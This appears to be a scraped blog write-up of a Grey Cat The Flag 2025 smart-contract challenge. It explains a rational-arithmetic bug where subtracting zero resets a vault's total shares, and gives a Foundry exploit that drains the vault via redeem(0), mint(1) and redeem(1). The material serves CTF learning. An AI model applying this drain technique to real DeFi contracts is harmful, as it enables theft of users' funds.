</span><span>        </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;total supply of vault  before redeeming&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> setupp</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">vault</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">totalSupply</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">/</span><span> </span><span class="token" style="color:#b5cea8">1e18</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#6a9955">// setupp.vault().withdraw(0);</span><span>
</span><span>        setupp</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">vault</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">redeem</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>            </span><span class="token" style="color:#ce9178">&quot;balance of attacker after redeeming by the attacker&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> setupp</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">vault</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">asset</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span>attacker</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">/</span><span> </span><span class="token" style="color:#b5cea8">1e18</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;total supply of vault  after minting by the attacker&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> setupp</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">vault</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">totalSupply</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">/</span><span> </span><span class="token" style="color:#b5cea8">1e18</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        setupp</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">grey</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">approve</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">address</span><span class="token" style="color:#d4d4d4">(</span><span>setupp</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">vault</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        setupp</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">vault</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">mint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;balance of attacker after minting&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> setupp</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">vault</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">asset</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span>attacker</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">/</span><span> </span><span class="token" style="color:#b5cea8">1e18</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;total supply of vault  after redeeming&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> setupp</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">vault</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">totalSupply</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">/</span><span> </span><span class="token" style="color:#b5cea8">1e18</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        setupp</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">vault</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">redeem</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;balance of attacker after redeeming 2nd time&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> setupp</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">vault</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">asset</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span>attacker</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">/</span><span> </span><span class="token" style="color:#b5cea8">1e18</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;total supply of vault after redeeming 2nd time&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> setupp</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">vault</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">totalSupply</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">/</span><span> </span><span class="token" style="color:#b5cea8">1e18</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#dcdcaa">assertTrue</span><span class="token" style="color:#d4d4d4">(</span><span>setupp</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">isSolved</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;not solved&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></code></div></pre>
<h2>Solutions Repo</h2>
<p><a href="https://github.com/BhaskarPeruri/Grey_Cat_The_Flag_2025_Solutions">Grey Cat The Flag 2025 Solutions</a></p>
<h2>Conclusion</h2>
<p>This challenge demonstrates how subtle bugs in custom mathematical libraries can lead to catastrophic failures in DeFi protocols. The vulnerability in the rational arithmetic library allowed complete bypass of the vault&#x27;s accounting system, highlighting the importance of thorough testing of custom mathematical operations, especially edge cases involving zero values.</p></div></article></main></div><!--$--><!--/$--><canvas class="fixed inset-0 w-full h-full pointer-events-none z-50"></canvas><!--$!--><template data-dgst="BAILOUT_TO_CLIENT_SIDE_RENDERING"></template><!--/$--><script src="/_next/static/chunks/4995e6db2daa090b.js" id="_R_" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[30783,[\"/_next/static/chunks/13f8b9b460cab25b.js\"],\"ThemeProvider\"]\n3:I[6489,[\"/_next/static/chunks/cc162e5663281663.js\",\"/_next/static/chunks/db909c0d74f8c046.js\"],\"default\"]\n4:I[72080,[\"/_next/static/chunks/cc162e5663281663.js\",\"/_next/static/chunks/db909c0d74f8c046.js\"],\"default\"]\n5:I[24390,[\"/_next/static/chunks/13f8b9b460cab25b.js\"],\"default\"]\n6:I[86647,[\"/_next/static/chunks/13f8b9b460cab25b.js\"],\"Analytics\"]\n8:I[45429,[\"/_next/static/chunks/cc162e5663281663.js\",\"/_next/static/chunks/db909c0d74f8c046.js\"],\"OutletBoundary\"]\n9:\"$Sreact.suspense\"\nb:I[45429,[\"/_next/static/chunks/cc162e5663281663.js\",\"/_next/static/chunks/db909c0d74f8c046.js\"],\"ViewportBoundary\"]\nd:I[45429,[\"/_next/static/chunks/cc162e5663281663.js\",\"/_next/static/chunks/db909c0d74f8c046.js\"],\"MetadataBoundary\"]\nf:I[21611,[\"/_next/static/chunks/cc162e5663281663.js\",\"/_next/static/chunks/db909c0d74f8c046.js\"],\"default\"]\n:HL[\"/_next/static/chunks/8a80e7184ad3a13f.css\",\"style\"]\n:HL[\"/_next/static/chunks/3aecbadcd45aebe7.css\",\"style\"]\n:HL[\"/_next/static/media/797e433ab948586e-s.p.dbea232f.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/media/caa3a2e1cccd8315-s.p.853070df.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"xOmyQrz477VMR99oMhEMM\",\"c\":[\"\",\"blogs\",\"gas-optimization-techniques\"],\"q\":\"\",\"i\":false,\"f\":[[[\"\",{\"children\":[\"blogs\",{\"children\":[[\"slug\",\"gas-optimization-techniques\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],[[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/chunks/8a80e7184ad3a13f.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}],[\"$\",\"link\",\"1\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/chunks/3aecbadcd45aebe7.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}],[\"$\",\"script\",\"script-0\",{\"src\":\"/_next/static/chunks/13f8b9b460cab25b.js\",\"async\":true,\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"lang\":\"en\",\"suppressHydrationWarning\":true,\"children\":[\"$\",\"body\",null,{\"className\":\"font-sans antialiased\",\"children\":[[\"$\",\"$L2\",null,{\"attribute\":\"class\",\"defaultTheme\":\"dark\",\"enableSystem\":true,\"disableTransitionOnChange\":true,\"children\":[\"$\",\"$L3\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L4\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":404}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}],[\"$\",\"$L5\",null,{}],[\"$\",\"$L6\",null,{}]]}]}]]}],{\"children\":[[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L3\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L4\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L3\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L4\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[[\"$\",\"$1\",\"c\",{\"children\":[\"$L7\",[[\"$\",\"script\",\"script-0\",{\"src\":\"/_next/static/chunks/cc162e5663281663.js\",\"async\":true,\"nonce\":\"$undefined\"}],[\"$\",\"script\",\"script-1\",{\"src\":\"/_next/static/chunks/b05a5109468bf8e7.js\",\"async\":true,\"nonce\":\"$undefined\"}],[\"$\",\"script\",\"script-2\",{\"src\":\"/_next/static/chunks/63bdf154c4daac0e.js\",\"async\":true,\"nonce\":\"$undefined\"}]],[\"$\",\"$L8\",null,{\"children\":[\"$\",\"$9\",null,{\"name\":\"Next.MetadataOutlet\",\"children\":\"$@a\"}]}]]}],{},null,false,false]},null,false,false]},null,false,false]},null,false,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$Lb\",null,{\"children\":\"$@c\"}],[\"$\",\"div\",null,{\"hidden\":true,\"children\":[\"$\",\"$Ld\",null,{\"children\":[\"$\",\"$9\",null,{\"name\":\"Next.Metadata\",\"children\":\"$@e\"}]}]}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\",\"content\":\"\"}]]}],false]],\"m\":\"$undefined\",\"G\":[\"$f\",[]],\"S\":true}\n"])</script><script>self.__next_f.push([1,"10:I[68275,[\"/_next/static/chunks/13f8b9b460cab25b.js\",\"/_next/static/chunks/cc162e5663281663.js\",\"/_next/static/chunks/b05a5109468bf8e7.js\",\"/_next/static/chunks/63bdf154c4daac0e.js\"],\"Header\"]\n11:I[2879,[\"/_next/static/chunks/13f8b9b460cab25b.js\",\"/_next/static/chunks/cc162e5663281663.js\",\"/_next/static/chunks/b05a5109468bf8e7.js\",\"/_next/static/chunks/63bdf154c4daac0e.js\"],\"BlogContent\"]\n12:T38b5,"])</script><script>self.__next_f.push([1,"## Challenge Overview\n\n**Objective:** Start with 1000 GREY tokens and exploit the vault system to accumulate at least 6000 GREY tokens.\n\n## Architecture Analysis\n\n### Core Components\n\nThe challenge consists of three main contracts working together:\n\n1. **SetUp Contract** - Challenge environment and initialization\n2. **RationalVault** - ERC20-like vault with custom rational number precision\n3. **RationalLib** - Custom library for fractional number arithmetic\n\n### SetUp Contract\n\n```javascript\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {GREY} from \"./lib/GREY.sol\";\nimport {RationalVault} from \"./Vault.sol\";\n\ncontract Setup {\n    bool public claimed;\n\n    // GREY token\n    GREY public grey;\n\n    // Challenge contracts\n    RationalVault public vault;\n\n    constructor() {\n        // Deploy the GREY token contract\n        grey = new GREY();\n\n        // Deploy challenge contracts\n        vault = new RationalVault(address(grey));\n\n        // Mint 6000 GREY for setup\n        grey.mint(address(this), 6000e18);\n\n        // Deposit 5000 GREY into the vault\n        grey.approve(address(vault), 5000e18);\n        vault.deposit(5000e18);\n    }\n\n    // Note: Call this function to claim 1000 GREY for the challenge\n    function claim() external {\n        require(!claimed, \"already claimed\");\n        claimed = true;\n\n        grey.mint(msg.sender, 1000e18);\n    }\n\n    // Note: Challenge is solved when you have 6000 GREY\n    function isSolved() external view returns (bool) {\n        return grey.balanceOf(msg.sender) \u003e= 6000e18;\n    }\n}\n\n```\n\nThe SetUp contract initializes the challenge environment:\n- Deploys a GREY token and RationalVault\n- Mints 6000 GREY tokens to itself\n- Deposits 5000 GREY into the vault (receiving 5000 shares)\n- Reserves 1000 GREY for the player via `claim()` function\n- Victory condition: Player must accumulate â‰¥ 6000 GREY tokens\n\n### RationalVault Contract\n\n```javascript\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.20;\n\nimport {IERC20} from \"./lib/IERC20.sol\";\nimport {Rational, RationalLib} from \"./lib/Rational.sol\";\n\ncontract RationalVault {\n    IERC20 public asset;\n\n    mapping(address =\u003e Rational) internal sharesOf;\n    Rational internal totalShares;\n\n    // ======================================== CONSTRUCTOR ========================================\n\n    constructor(address _asset) {\n        asset = IERC20(_asset);\n    }\n\n    // ======================================== MUTATIVE FUNCTIONS ========================================\n\n    function deposit(uint128 amount) external {\n        Rational _shares = convertToShares(amount);\n\n        sharesOf[msg.sender] = sharesOf[msg.sender] + _shares;\n        totalShares = totalShares + _shares;\n\n        asset.transferFrom(msg.sender, address(this), amount);\n    }\n\n    function mint(uint128 shares) external {\n        Rational _shares = RationalLib.fromUint128(shares);\n        uint256 amount = convertToAssets(_shares);\n\n        sharesOf[msg.sender] = sharesOf[msg.sender] + _shares;\n        totalShares = totalShares + _shares;\n\n        asset.transferFrom(msg.sender, address(this), amount);\n    }\n\n    function withdraw(uint128 amount) external {\n        Rational _shares = convertToShares(amount);\n\n        sharesOf[msg.sender] = sharesOf[msg.sender] - _shares;\n        totalShares = totalShares - _shares;\n\n        asset.transfer(msg.sender, amount);\n    }\n\n    function redeem(uint128 shares) external {\n        Rational _shares = RationalLib.fromUint128(shares);\n        uint256 amount = convertToAssets(_shares);\n\n        sharesOf[msg.sender] = sharesOf[msg.sender] - _shares;\n        totalShares = totalShares - _shares;\n\n        asset.transfer(msg.sender, amount);\n    }\n\n    // ======================================== VIEW FUNCTIONS ========================================\n\n    function totalAssets() public view returns (uint128) {\n        return uint128(asset.balanceOf(address(this)));\n    }\n\n    function convertToShares(uint128 assets) public view returns (Rational) {\n        if (totalShares == RationalLib.ZERO) return RationalLib.fromUint128(assets);\n\n        Rational _assets = RationalLib.fromUint128(assets);\n        Rational _totalAssets = RationalLib.fromUint128(totalAssets());\n        Rational _shares = _assets / _totalAssets * totalShares;\n\n        return _shares;\n    }\n\n    function convertToAssets(Rational shares) public view returns (uint128) {\n        if (totalShares == RationalLib.ZERO) return RationalLib.toUint128(shares);\n\n        Rational _totalAssets = RationalLib.fromUint128(totalAssets());\n        Rational _assets = shares / totalShares * _totalAssets;\n\n        return RationalLib.toUint128(_assets);\n    }\n\n    function totalSupply() external view returns (uint256) {\n        return RationalLib.toUint128(totalShares);\n    }\n\n    function balanceOf(address account) external view returns (uint256) {\n        return RationalLib.toUint128(sharesOf[account]);\n    }\n}\n\n```\n\nThe vault implements a shares-based system similar to ERC4626:\n- **Deposits/Mints:** Users deposit assets to receive proportional shares\n- **Withdrawals/Redeems:** Users burn shares to retrieve underlying assets\n- **Conversion Logic:** Dynamic exchange rates between assets and shares based on vault balance\n- **Precision:** Uses custom Rational math instead of standard integer arithmetic\n\n### RationalLib Contract\n\n```javascript\n\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.20;\n\n// Upper 128 bits is the numerator, lower 128 bits is the denominator\ntype Rational is uint256;\n\nusing {add as +, sub as -, mul as *, div as /, eq as ==, neq as !=} for Rational global;\n\n// ======================================== CONVERSIONS ========================================\n\nlibrary RationalLib {\n    Rational constant ZERO = Rational.wrap(0);\n\n    function fromUint128(uint128 x) internal pure returns (Rational) {\n        return toRational(x, 1);\n    }\n\n    function toUint128(Rational x) internal pure returns (uint128) {\n        (uint256 numerator, uint256 denominator) = fromRational(x);\n        return numerator == 0 ? 0 : uint128(numerator / denominator);\n    }\n}\n\n// ======================================== OPERATIONS ========================================\n\nfunction add(Rational x, Rational y) pure returns (Rational) {\n    (uint256 xNumerator, uint256 xDenominator) = fromRational(x);\n    (uint256 yNumerator, uint256 yDenominator) = fromRational(y);\n\n    if (xNumerator == 0) return y;\n    if (yNumerator == 0) return x;\n\n    // (a / b) + (c / d) = (ad + cb) / bd\n    uint256 numerator = xNumerator * yDenominator + yNumerator * xDenominator;\n    uint256 denominator = xDenominator * yDenominator;\n\n    return toRational(numerator, denominator);\n}\n\nfunction sub(Rational x, Rational y) pure returns (Rational) {\n    (uint256 xNumerator, uint256 xDenominator) = fromRational(x);\n    (uint256 yNumerator, uint256 yDenominator) = fromRational(y);\n\n    if (yNumerator != 0) require(xNumerator != 0, \"Underflow\");\n\n    // (a / b) - (c / d) = (ad - cb) / bd\n    // a / b \u003e= c / d implies ad \u003e= cb, so the subtraction will never underflow when x \u003e= y\n    uint256 numerator = xNumerator * yDenominator - yNumerator * xDenominator;\n    uint256 denominator = xDenominator * yDenominator;\n\n    return toRational(numerator, denominator);\n}\n\nfunction mul(Rational x, Rational y) pure returns (Rational) {\n    (uint256 xNumerator, uint256 xDenominator) = fromRational(x);\n    (uint256 yNumerator, uint256 yDenominator) = fromRational(y);\n\n    if (xNumerator == 0 || yNumerator == 0) return RationalLib.ZERO;\n\n    // (a / b) * (c / d) = ac / bd\n    uint256 numerator = xNumerator * yNumerator;\n    uint256 denominator = xDenominator * yDenominator;\n\n    return toRational(numerator, denominator);\n}\n\nfunction div(Rational x, Rational y) pure returns (Rational) {\n    (uint256 xNumerator, uint256 xDenominator) = fromRational(x);\n    (uint256 yNumerator, uint256 yDenominator) = fromRational(y);\n\n    if (xNumerator == 0) return RationalLib.ZERO;\n    require(yNumerator != 0, \"Division by zero\");\n\n    // (a / b) / (c / d) = ad / bc\n    uint256 numerator = xNumerator * yDenominator;\n    uint256 denominator = xDenominator * yNumerator;\n\n    return toRational(numerator, denominator);\n}\n\nfunction eq(Rational x, Rational y) pure returns (bool) {\n    (uint256 xNumerator,) = fromRational(x);\n    (uint256 yNumerator,) = fromRational(y);\n    if (xNumerator == 0 \u0026\u0026 yNumerator == 0) return true;\n\n    return Rational.unwrap(x) == Rational.unwrap(y);\n}\n\nfunction neq(Rational x, Rational y) pure returns (bool) {\n    return !eq(x, y);\n}\n\n// ======================================== HELPERS ========================================\n\nfunction fromRational(Rational v) pure returns (uint256 numerator, uint256 denominator) {\n    numerator = Rational.unwrap(v) \u003e\u003e 128;\n    denominator = Rational.unwrap(v) \u0026 type(uint128).max;\n}\n\nfunction toRational(uint256 numerator, uint256 denominator) pure returns (Rational) {\n    if (numerator == 0) return RationalLib.ZERO;\n\n    uint256 d = gcd(numerator, denominator);\n    numerator /= d;\n    denominator /= d;\n\n    require(numerator \u003c= type(uint128).max \u0026\u0026 denominator \u003c= type(uint128).max, \"Overflow\");\n\n    return Rational.wrap(numerator \u003c\u003c 128 | denominator);\n}\n\nfunction gcd(uint256 x, uint256 y) pure returns (uint256) {\n    while (y != 0) {\n        uint256 t = y;\n        y = x % y;\n        x = t;\n    }\n    return x;\n}\n\n```\n\nThis library implements fractional numbers as a custom type:\n\n```solidity\ntype Rational is uint256;\n```\n\n**Encoding Scheme:**\n```\n|   Upper 128 bits   |   Lower 128 bits   |\n|     Numerator      |    Denominator     |\n```\n\n**Key Functions:**\n- `toRational()` - Encodes numerator/denominator into packed uint256\n- `fromRational()` - Extracts numerator and denominator from packed value\n- Arithmetic operations: `add()`, `sub()`, `mul()`, `div()`\n\n## Vulnerability Analysis\n\n### The Critical Bug\n\nThe vulnerability lies in the `sub()` function of RationalLib:\n\n```solidity\n\nfunction sub(Rational x, Rational y) pure returns (Rational) {\n    (uint256 xNumerator, uint256 xDenominator) = fromRational(x);\n    (uint256 yNumerator, uint256 yDenominator) = fromRational(y);\n\n    if (yNumerator != 0) require(xNumerator != 0, \"Underflow\");\n\n    // (a / b) - (c / d) = (ad - cb) / bd\n    // a / b \u003e= c / d implies ad \u003e= cb, so the subtraction will never underflow when x \u003e= y\n    uint256 numerator = xNumerator * yDenominator - yNumerator * xDenominator;\n    uint256 denominator = xDenominator * yDenominator;\n\n    return toRational(numerator, denominator);\n}\n```\n\n**The Issue:**\nWhen subtracting zero (`yNumerator == 0, yDenominator == 0`) from any rational number `x`:\n- The underflow check is bypassed\n- Calculation becomes: `numerator = xNumerator * 0 - 0 * xDenominator = 0`, `denominator = xDenominator * 0 = 0`\n- `toRational(0, 0)` returns the canonical ZERO rational\n- **Result: `x - 0 = 0` instead of `x`**\n\nThis breaks the fundamental mathematical property that `x - 0 = x`.\n\n## Exploitation Vector\n\nThe vault's `redeem()` and `withdraw()` functions both perform:\n```solidity\ntotalShares = totalShares - _shares;\n```\n\nBy calling `redeem(0)` or `withdraw(0)`, we can trigger the bug where `totalShares - ZERO = ZERO`.\n\n## Exploitation Strategy\n\n### Step-by-Step Attack\n\n1. **Initial Setup**\n   ```solidity\n   setup.claim(); // Receive 1000 GREY tokens\n   ```\n\n2. **Trigger the Vulnerability**\n   ```solidity\n   vault.redeem(0); // totalShares becomes ZERO due to bug\n   ```\n   \n   After this call:\n   - Vault's `totalShares` = 0 (should be 5000e18)\n   - Vault's asset balance = 5000e18 GREY (unchanged)\n\n3. **Re-bootstrap with Minimal Investment**\n   ```solidity\n   vault.mint(1); // Mint 1 share for 1 wei\n   ```\n   \n   Since `totalShares == 0`, the conversion rate is 1:1:\n   - Cost: 1 wei GREY\n   - Received: 1 share\n   - New state: `totalShares = 1`, vault balance = 5000e18 + 1 wei\n\n4. **Drain the Vault**\n   ```solidity\n   vault.redeem(1); // Redeem our single share\n   ```\n   \n   Conversion calculation:\n   ```\n   assets = shares Ã— totalAssets / totalShares\n   assets = 1 Ã— (5000e18 + 1) / 1 = 5000e18 + 1 wei\n   ```\n\n5. **Final State**\n   - Started with: 1000e18 GREY\n   - Spent: 1 wei GREY\n   - Received: 5000e18 + 1 wei GREY\n   - **Total: 6000e18 GREY** \n\n## Solution\n\n```javascript\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {Test, console} from \"forge-std/Test.sol\";\nimport {Setup} from \"../src/rational_challenge/Setup.sol\";\n\ncontract RationalSolution is Test {\n    Setup public setupp;\n    address public attacker = makeAddr(\"attacker\");\n\n    function setUp() public {\n        setupp = new Setup();\n    }\n\n    function testExploit() public {\n        //first we are claiming our 1000 GREY given by the setup 